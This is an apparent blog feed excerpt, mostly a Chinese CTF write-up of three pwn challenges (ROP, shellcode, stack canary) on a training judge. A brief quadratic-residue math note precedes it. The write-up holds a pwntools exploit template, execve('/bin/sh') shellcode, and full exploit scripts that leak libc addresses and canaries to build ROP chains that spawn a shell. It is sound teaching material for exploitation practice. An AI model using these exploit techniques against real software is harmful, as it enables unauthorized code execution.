title="二次剩余"></a>二次剩余</h2><p>![D25C01F0-E4A2-46BD-99A0-DA01E68CAFD7](/Users/apple/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1213531141/QQ/Temp.db/D25C01F0-E4A2-46BD-99A0-DA01E68CAFD7.png)</p><h5 id="性质：模数是素数p（p-gt-2）"><a href="#性质：模数是素数p（p-gt-2）" class="headerlink" title="性质：模数是素数p（p&gt;2）"></a>性质：模数是素数p（p&gt;2）</h5><ol><li><p>每个a对应两个x</p></li><li><p>QR和QNR元素数量相同 (各有(p-1)/2个元素)</p></li></ol><p>![005406C3-7612-450D-9661-4C75693DCC20](/Users/apple/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1213531141/QQ/Temp.db/005406C3-7612-450D-9661-4C75693DCC20.png)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;最大公约数-gcd-a-b&quot;&gt;&lt;a href=&quot;#最大公约数-gcd-a-b&quot; class=&quot;headerlink&quot; title=&quot;最大公约数 gcd(a,b)&quot;&gt;&lt;/a&gt;最大公约数 gcd(a,b)&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;h3 id=&quot;欧几里得算法-a-b</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://youops.github.io/2021/10/26/Blue-Whale-OJ-Pwn/"/>
    <id>https://youops.github.io/2021/10/26/Blue-Whale-OJ-Pwn/</id>
    <published>2021-10-26T13:53:44.289Z</published>
    <updated>2021-10-26T13:53:44.289Z</updated>
    
    <content type="html"><![CDATA[<p>title: Blue-Whale OJ Pwn<br>tags:</p><ul><li>pwn</li><li>writeup<br>categories:</li><li>pwn<br>comments: true<br>date: 2021-10-26 21:52:18<br>description: BlueWhale OJ pwn writeUp for challenge “canary”.</li></ul><h1 id="模版"><a href="#模版" class="headerlink" title="模版"></a>模版</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> abspath</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Config</span>:</span><br><span class="line">    host = <span class="string">&#x27;campus1.blue-whale.me&#x27;</span></span><br><span class="line">    port = <span class="number">9993</span></span><br><span class="line">    elf = <span class="string">&#x27;./pwn4&#x27;</span></span><br><span class="line">    libc = <span class="literal">None</span></span><br><span class="line">    libc = <span class="string">&#x27;./libc6_2.27-3ubuntu1.4_amd64.so&#x27;</span></span><br><span class="line">    <span class="comment"># Enable amd64.</span></span><br><span class="line">    x86_64 = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># To enbale debug mode, by using &quot;python exp.py d&quot;.</span></span><br><span class="line">    debug_mode = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># To enbale remote mode, by using &quot;python exp.py r&quot;.</span></span><br><span class="line">    remote_mode = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;d&#x27;</span> <span class="keyword">in</span> argv:</span><br><span class="line">            debug_mode = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;r&#x27;</span> <span class="keyword">in</span> argv:</span><br><span class="line">            remote_mode = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug_mode:</span><br><span class="line">        context.update(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> x86_64:</span><br><span class="line">        context.update(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pwn</span>:</span><br><span class="line">    proc_base = libc_base = bin_sh = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 25 bytes.</span></span><br><span class="line">    shellcode = <span class="string">&#x27;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">    pg = cyclic_gen()</span><br><span class="line">    libc = <span class="literal">None</span></span><br><span class="line">    elf = ELF(Config.elf)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> Config.libc:</span><br><span class="line">        libc = ELF(Config.libc)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>):</span><br><span class="line">            bin_sh = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span>, p=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="keyword">if</span> Config.debug_mode:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> Config.remote_mode:</span><br><span class="line">                gdb.attach(conn, cmd)</span><br><span class="line">        <span class="keyword">if</span> p:</span><br><span class="line">            pause()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_conn</span>():</span><br><span class="line">        <span class="keyword">if</span> Config.remote_mode:</span><br><span class="line">            conn = remote(Config.host, Config.port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            conn = process(</span><br><span class="line">                Pwn.elf.path, env=&#123;</span><br><span class="line">                    <span class="string">&#x27;LD_PRELOAD&#x27;</span>: Pwn.libc.path <span class="keyword">if</span> Config.libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">                &#125;</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            Pwn.proc_base = conn.libs()[abspath(Pwn.elf.path)]</span><br><span class="line">            log.info(<span class="string">&#x27;Process base address: %s&#x27;</span> % <span class="built_in">hex</span>(Pwn.proc_base))</span><br><span class="line">            <span class="keyword">if</span> Pwn.libc:</span><br><span class="line">                Pwn.libc_base = conn.libs()[abspath(Pwn.libc.path)]</span><br><span class="line">                log.info(<span class="string">&#x27;Libc base address: %s&#x27;</span> % <span class="built_in">hex</span>(Pwn.libc_base))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> conn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Debug funciton. Access 2 parameters, the first is gdb script and</span></span><br><span class="line"><span class="comment"># second is a bool to enable pause process after gdb attached.</span></span><br><span class="line">d = Pwn.debug</span><br><span class="line"><span class="comment"># Get a pwn connection, including local and remote.</span></span><br><span class="line">get_conn = Pwn.get_conn</span><br><span class="line"></span><br><span class="line"><span class="comment"># The pwn connection.</span></span><br><span class="line">conn = get_conn()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Payload generator, generate string like &quot;aaaabaaacaaa&quot;...</span></span><br><span class="line">pg = Pwn.pg</span><br><span class="line"><span class="comment"># The ELF file.</span></span><br><span class="line">elf = Pwn.elf</span><br><span class="line"><span class="comment"># The libc file.</span></span><br><span class="line">libc = Pwn.libc</span><br><span class="line"><span class="comment"># Process base address. It is very usable if enable PIE.</span></span><br><span class="line">proc_base = Pwn.proc_base</span><br><span class="line"><span class="comment"># Libc base address. Only availbale with local libc, for checking leaked libc address.</span></span><br><span class="line">libc_base = Pwn.libc_base</span><br><span class="line"><span class="comment"># The &quot;/bin/sh&quot; offset address in libc.</span></span><br><span class="line">bin_sh = Pwn.bin_sh</span><br><span class="line"><span class="comment"># A standard 25 bytes shellcode.</span></span><br><span class="line">shellcode = Pwn.shellcode</span><br><span class="line"><span class="comment"># -------------------------=[ Write your pwn code here ]=-------------------------</span></span><br></pre></td></tr></table></figure><h1 id="ROP-50"><a href="#ROP-50" class="headerlink" title="ROP(50)"></a>ROP(50)</h1><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>首先检查保护机制，发现开启了NX（堆栈不可执行），因此通过调用libc中的system(‘/bin/sh’)拿到shell。首先需要计算got表的基地址，计算方法是找到一个函数的got地址以及该函数在libc中的偏移，两者相减。如：main_addr - libc.symbols[‘__libc_start_main’]。其中main_addr是通过栈溢出打印出来，具体如下：<code>pg.get(0x58+4) + p32(puts_plt) + p32(main) + p32(main_got))</code>。再用got基地址+system在libc的偏移即可算出system函数在got表中的地址，同理查找‘/bin/sh’的地址。</p><h3 id="注意点："><a href="#注意点：" class="headerlink" title="注意点："></a>注意点：</h3><ul><li><p>关于NX（堆栈不可执行）将堆栈内存页标记为不可执行，当控制流程转入堆栈上以后，CPU若尝试在堆栈上执行指令时就会引发异常。编译器通常默认开启NX。NX为了防止堆栈上的shellcode，一般通过ROP解决NX，使用ROP只需要把ROP链的各个地址与参数压入栈中，最终跳转到shellcode地址或者构造系统调用。</p></li><li><p><code>pg.get(0x58+4) + p32(puts_plt) + p32(main) + p32(main_got))</code> 其中，调用puts函数 main_got是要输出的参数，main是返回地址。</p></li><li><p>flag为<code>ctf&#123;ROP_1s_Really_Usefu11y&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = <span class="number">0x80484EA</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug(</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># b*0x0804850E</span></span><br><span class="line"><span class="comment"># c</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;welcome to ROP world\n&#x27;</span>, pg.get(<span class="number">0x58</span>+<span class="number">4</span>) + p32(puts_plt) + p32(main) + p32(main_got))</span><br><span class="line"></span><br><span class="line">main_addr = u32(conn.recv()[:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">&#x27;start address:%s&#x27;</span> %<span class="built_in">hex</span>(main_addr))</span><br><span class="line">libc_addr = main_addr - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc address:%s&#x27;</span> %<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;system address:%s&#x27;</span> %<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;welcome to ROP world\n&#x27;</span>, pg.get(<span class="number">0x58</span>+<span class="number">4</span>) + p32(system_addr) + pg.get(<span class="number">4</span>) + p32(str_bin_sh+libc_addr))</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h1 id="shellcode-100"><a href="#shellcode-100" class="headerlink" title="shellcode(100)"></a>shellcode(100)</h1><h3 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h3><p>首先检查保护机制，发现未开启NX，则可以利用shellcode。但是由于开启了ASLR，则需要利用jmp esp事控制流转向栈上的shellcode。通过<code>ROPgadget --binary pwn3  --only &#39;jmp&#39;</code>查找jmp esp指令地址。</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p><code>pg.get(0x1c+4)+p32(ret_addr)+shellcode</code> 执行完ret_addr后，控制流就跳到栈顶，而现在栈顶就是shellcode</p><p>flag为<code>ctf&#123;1-10w_d0_Jou_kn0w_sh311c0de&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -------------------------=[ Write your pwn code here ]=-------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">ret_addr = <span class="number">0x08048617</span></span><br><span class="line">d(</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b*0x0804856C</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">) </span><br><span class="line">conn.sendafter(<span class="string">&quot;input your name\n&quot;</span>,pg.get(<span class="number">0x1c</span>+<span class="number">4</span>)+p32(ret_addr)+shellcode)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="canary-200"><a href="#canary-200" class="headerlink" title="canary(200)"></a>canary(200)</h1><h3 id="思路：-2"><a href="#思路：-2" class="headerlink" title="思路："></a>思路：</h3><p>看到栈溢出以及canary的位置可以想到通过栈溢出覆盖到canary的‘/x00’位，来输出canary的值。之后再利用libc找到system、binsh的地址拿到shell。</p><h3 id="注意点：-1"><a href="#注意点：-1" class="headerlink" title="注意点："></a>注意点：</h3><ul><li>修改canary，计算偏移时 在ida中一般为buf到ebp的位置-canary到ebp的位置+1（覆盖’\x00’）如果行末读入了‘\n’，则‘\n’覆盖了canary的’\x00’位，不需要+1。也可在gdb中查看canary的位置，一般在栈中 末尾为‘00’字样</li><li>接受的地址我们要用u64（）改成数字形式，而最后send的时候都是以字符类型发送的，所以在最后send时要用p64转换成字符。</li><li>关于rop链 填写在栈溢出的ret位置。对于64位，没个pop_ret都进行了两步操作：1.将接下来的一条数据作为参数pop出栈，此时指针指向第三条数据。2.ret 第三条指令 。例如<ol><li> p64(pop_rdi_ret) + p64(elf.got[‘puts’]) + p64(elf.plt[‘puts’]) + p64(main_addr)   将elf.got[‘puts’]作为参数弹出，执行elf.plt[‘puts’]，此时elf.got[‘puts’]为elf.plt[‘puts’]的参数，执行命令后即可将puts的真是地址输出。由于puts自带ret，则接着执行下一条命令，即 ret main_addr</li><li>p64(pop_rdi_ret) + p64(libc_addr + str_bin_sh) + p64(ret) + p64(system_addr)) 将p64(libc_addr + str_bin_sh) 作为参数弹出 执行p64(system_addr))，由于地址对其原因，中间添加p64(ret).</li><li>p64(pop_rdi_ret) + p64(elf.got[‘puts’]) + p64(elf.plt[‘puts’]) + p64(pop_rdi_ret) + p64(elf.got[‘printf’]) + p64(elf.plt[‘puts’]) + p64(main_addr)) 两条基本的rop链连起来</li></ol></li><li>利用Ropgadget查找pop_rdi_ret   <code>ROPgadget --binary 文件名  --only &#39;pop|ret&#39; | grep &#39;eax&#39;</code>                  <code>binary 文件名  --string &#39;/bin/sh&#39;</code> <code>ROPgadget --binary 文件名  --only &#39;int&#39;</code> int 0x80  </li><li>接受的puts_addr是以0x7f开头  并且只有6位 需要u64(conn.recv(6).ljust(8,’\x00’))填充</li><li>flag为<code>ctf&#123;st4ck_C4n41y_1s_not_secure&#125;</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -------------------------=[ Write your pwn code here ]=-------------------------</span></span><br><span class="line">offset = <span class="number">0x108</span></span><br><span class="line">payload = pg.get(offset)</span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">&quot;\n---------------------------------\n&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">&quot;input name length\n&quot;</span>, <span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">&quot;len: 9999&quot;</span>, payload)</span><br><span class="line">conn.recvuntil(payload)</span><br><span class="line">canary = u64(conn.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x0000000000400650</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x000000000040087e</span></span><br><span class="line">ret = <span class="number">0x00000000004005b9</span></span><br><span class="line">payload = pg.get(offset) + p64(canary) + pg.get(<span class="number">0x38</span>) + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">&quot;\n---------------------------------\n&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">&quot;input name length\n&quot;</span>, <span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">&quot;len: 9999&quot;</span>, payload)</span><br><span class="line">d(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b*0x000000000040086E</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">&quot;\n---------------------------------\n&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">puts_addr = u64(conn.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;puts address :%s&#x27;</span> %<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_addr = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = pg.get(offset) + p64(canary) + pg.get(<span class="number">0x38</span>) +p64(pop_rdi_ret) + p64(libc_addr+bin_sh) + p64(ret)+p64(system_addr)</span><br><span class="line">conn.sendlineafter(<span class="string">&quot;\n---------------------------------\n&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">&quot;input name length\n&quot;</span>, <span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">&quot;len: 9999&quot;</span>, payload)</span><br><span class="line">conn.sendlineafter(<span class="string">&quot;\n---------------------------------\n&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;title: Blue-Whale OJ Pwn&lt;br&gt;tags:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;pwn&lt;/li&gt;
&lt;li&gt;writeup&lt;br&gt;categories:&lt;/li&gt;
&lt;li&gt;pwn&lt;br&gt;comments: true&lt;br&gt;date: 2021-10-26 21:</summary>
      
    
    
    
    
  </entry>
  
</feed>
